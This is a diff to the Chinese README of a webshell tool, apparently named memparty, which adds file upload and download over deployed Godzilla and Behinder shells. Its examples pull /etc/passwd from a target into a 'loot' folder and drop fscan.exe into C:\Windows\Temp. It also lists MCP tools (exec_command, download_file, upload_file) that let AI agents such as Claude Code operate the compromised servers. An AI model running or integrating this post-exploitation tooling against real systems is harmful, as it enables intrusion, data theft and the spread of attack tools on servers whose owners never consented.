@@ -20,9 +20,11 @@
   凭证是否正确（回显 / 握手双向校验）。
 - **命令执行** —— `memparty exec` 在已部署的哥斯拉 / 冰蝎马上执行命令并回显输出
   （真实 `execCommand` / `Cmd` payload 往返）。
+- **文件传输** —— `memparty upload` / `memparty download` 在哥斯拉 / 冰蝎马上传下载文件，
+  分块传输 + 完整性校验（哥斯拉校验远端大小，冰蝎比对 MD5）。
 - **命名目标** —— `memparty save` 把 shell 存进项目（支持备注 + 分类），之后
   `memparty exec web1/bh9060 --cmd "whoami"` 一个名字就够。
-- **操作日志** —— 每次 gen/probe/connect/exec/save/note/remove 操作都追加到
+- **操作日志** —— 每次 gen/probe/connect/exec/download/upload/save/note/remove 操作都追加到
   `~/.memparty/operations.jsonl`，`memparty log` 按分类和目标查询。
 - **灵活的输出** —— payload 默认输出到 stdout，`-o file` 写文件（`.class`/`.jar` 自动
   base64 解码）。
@@ -173,6 +175,35 @@ memparty exec -u http://target/shell.jsp -t behinder --pass rebeyond --cmd "cat 
 门禁头参数与 `connect` 相同；`--json` 返回 `{ ok, tool, url, command, output, durationMs }`，
 方便脚本与 agent 使用。
 
+### 文件上传 / 下载
+
+`memparty upload` / `memparty download` 在已部署的哥斯拉 / 冰蝎 shell 上传输文件（真实
+协议：哥斯拉调 payload 的 `uploadFile`/`bigFileUpload`/`bigFileDownload` 方法，冰蝎上传
+`FileOperation` payload 类走 create+append / downloadPart）。大文件自动分块；哥斯拉传输后
+校验远端文件大小，冰蝎比对远端 MD5——校验不过直接报错，不会留下"看起来成功"的坏文件。
+
+```bash
+# 下载：默认落到当前目录的远端同名文件；-o 指定目标（目录则保留远端文件名）
+memparty download -u http://target/shell.jsp -t godzilla --pass pass --key key \
+  --header-value my-secret-token /etc/passwd -o loot/passwd
+
+# 已存在的本地文件不会被覆盖，除非显式 --force
+memparty download web1 /var/log/app.log --force
+
+# 上传：覆盖写远端文件（截断 + 写入），上限 64 MiB
+memparty upload web1/bh9060 ./fscan.exe "C:\Windows\Temp\f.exe"
+```
+
+失败语义要清楚：远端文件不存在、凭证错误、分块重试耗尽都会以退出码 1 报错；上传中途失败
+时报错会提示远端文件可能是残缺的。`--json` 返回
+`{ ok, tool, url, direction, remotePath, localPath, bytes, durationMs }`。
+
+非 ASCII 路径：冰蝎总是可用（路径经 class 常量池传输，与平台字符集无关）；哥斯拉的路径参数
+由服务端按平台默认字符集解码——JDK 18+ 与 Linux 都是 UTF-8，无需任何处理；老 JDK（8/11/17）
+的中文 Windows 目标是 GBK，传中文路径时加 `--remote-charset GBK`（MCP 参数 `remoteCharset`）。
+冰蝎对 >128 MiB 的文件改用尺寸校验代替 MD5（payload 的 check 会逐字节读全文件）。
+单文件上限：哥斯拉 2 GiB（payload 的 int 限制），冰蝎上传 64 MiB、下载 2 GiB。
+
 ### 命名目标（项目）
 
 保存一次，之后用名字引用 —— 不用再抄一串参数。shell 存放在**项目**里：一个项目
@@ -207,9 +238,9 @@ memparty remove web1          # 删整个项目
 
 ### 操作日志
 
-每次操作（gen、probe、connect、exec、save/note/remove）都以一行 JSON 追加到
+每次操作（gen、probe、connect、exec、download、upload、save/note/remove）都以一行 JSON 追加到
 `~/.memparty/operations.jsonl` —— 记录目标、结果、耗时，exec 还记录命令和截断后的输出。
-凭证和 payload 内容不会写入日志。
+凭证、payload 内容和传输的文件内容不会写入日志。
 
 ```bash
 memparty log                          # 最近 50 条，新的在前
@@ -330,7 +361,8 @@ Claude Code / Claude Desktop 配置示例：
 
 暴露的工具：`list_servers`、`list_config`、`list_packers`、`list_command_configs`、
 `generate_memshell`、`generate_probe`、`parse_classname`、`server_version`、`connect_test`、
-`exec_command`、`target_save`、`target_note`、`target_list`、`target_remove`、`log_list`。
+`exec_command`、`download_file`、`upload_file`、`target_save`、`target_note`、`target_list`、
+`target_remove`、`log_list`。
 
 ## AI 技能（Claude Code）
 
